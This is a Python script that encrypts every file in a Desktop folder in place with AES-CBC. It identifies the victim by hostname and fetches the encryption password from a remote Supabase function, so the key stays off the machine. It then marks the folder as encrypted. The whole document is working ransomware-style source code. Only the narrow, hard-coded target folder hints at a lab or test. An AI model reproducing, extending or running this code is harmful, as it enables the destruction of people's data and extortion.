import os, sys, requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

SERVER_URL = "https://<project-ref>.functions.supabase.co/store-credentials"
SHARED_KEY = os.getenv("EDGE_SHARED_KEY")

def generate_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(), length=32, salt=salt,
        iterations=100000, backend=default_backend()
    )
    return kdf.derive(password.encode())

def encrypt_file(file_path: str, password: str):
    salt = os.urandom(16)
    key = generate_key(password, salt)
    iv = os.urandom(16)
    data = open(file_path, "rb").read()

    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    enc = cipher.encryptor().update(padded) + cipher.encryptor().finalize()

    open(file_path, "wb").write(salt + iv + enc)

def encrypt_directory(path: str, password: str):
    for root, _, files in os.walk(path):
        for f in files:
            fp = os.path.join(root, f)
            try:
                encrypt_file(fp, password)
            except Exception as e:
                print(f"Failed {fp}: {e}")

def store_and_get_password(user_id: str) -> str:
    if not SHARED_KEY:
        raise RuntimeError("EDGE_SHARED_KEY not set; export it first")
    headers = {"x-shared-key": SHARED_KEY}
    r = requests.post(SERVER_URL, json={"user_id": user_id}, headers=headers)
    r.raise_for_status()
    return r.json()["password"]

if __name__ == "__main__":
    user_id = os.uname().nodename
    print(f"User ID: {user_id}")

    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    target_folder = os.path.join(desktop, "personal_Fa0337")

    if not os.path.exists(target_folder):
        print("⚠️ Target folder not found.")
        sys.exit(0)

    # Request password from server
    password = store_and_get_password(user_id)

    # Encrypt
    print("🔐 Encrypting...")
    encrypt_directory(target_folder, password)

    # Mark folder as encrypted
    open(os.path.join(target_folder, ".encrypted_flag"), "w").write("ENCRYPTED")
    print("✅ Encryption complete.")
